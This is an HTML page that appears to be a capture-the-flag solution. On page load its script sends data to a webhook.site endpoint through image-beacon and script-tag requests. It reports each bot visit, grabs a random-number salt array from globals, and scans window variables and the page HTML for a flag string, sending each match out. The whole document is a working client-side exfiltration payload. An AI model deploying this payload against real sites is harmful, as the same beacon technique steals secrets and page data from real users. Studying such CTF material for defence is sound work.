<!DOCTYPE html>
<html>
<head>
    <title>Simple Flag Extraction</title>
</head>
<body>
    <h1>Flag Extraction</h1>
    <div id="status">Extracting flag...</div>
    
    <script>
        const WEBHOOK_URL = 'https://webhook.site/eb547890-9955-4e02-a8ae-3083dba7c032';
        
        async function exfiltrateData(data) {
            const payload = typeof data === 'string' ? data : JSON.stringify(data);
            
            // Image beacon (most reliable)
            const img = new Image();
            img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(payload)}`;
            document.body.appendChild(img);
            
            // Script tag backup
            const script = document.createElement('script');
            script.src = `${WEBHOOK_URL}?callback=x&data=${encodeURIComponent(payload)}`;
            document.head.appendChild(script);
        }
        
        async function extractFlag() {
            // Send confirmation
            await exfiltrateData({
                status: 'bot_visited',
                timestamp: new Date().toISOString()
            });
            
            // Check if mathRandomInvocations exists in global scope
            if (typeof mathRandomInvocations !== 'undefined' && mathRandomInvocations.length > 0) {
                const salt = mathRandomInvocations[mathRandomInvocations.length - 1];
                
                await exfiltrateData({
                    salt: salt,
                    salts_array: mathRandomInvocations,
                    message: 'Found mathRandomInvocations directly!'
                });
                
                // Now we have the salt, we can construct the SafeFrame URL and get the flag
                // But actually, let's check if the flag is already in the DOM or accessible
                
                // Check all global variables for flag
                for (let prop in window) {
                    if (window[prop] && typeof window[prop] === 'string' && window[prop].includes('CTF{')) {
                        await exfiltrateData({
                            flag: window[prop],
                            method: 'global_variable',
                            property: prop
                        });
                    }
                }
                
                // Check document content
                const pageContent = document.documentElement.innerHTML;
                const flagMatch = pageContent.match(/CTF\{[^}]+\}/);
                if (flagMatch) {
                    await exfiltrateData({
                        flag: flagMatch[0],
                        method: 'document_content'
                    });
                }
                
            } else {
                await exfiltrateData({
                    error: 'mathRandomInvocations not found',
                    global_vars: Object.keys(window).filter(k => k.includes('math') || k.includes('random') || k.includes('salt'))
                });
            }
        }
        
        // Start extraction
        extractFlag();
    </script>
</body>
</html>
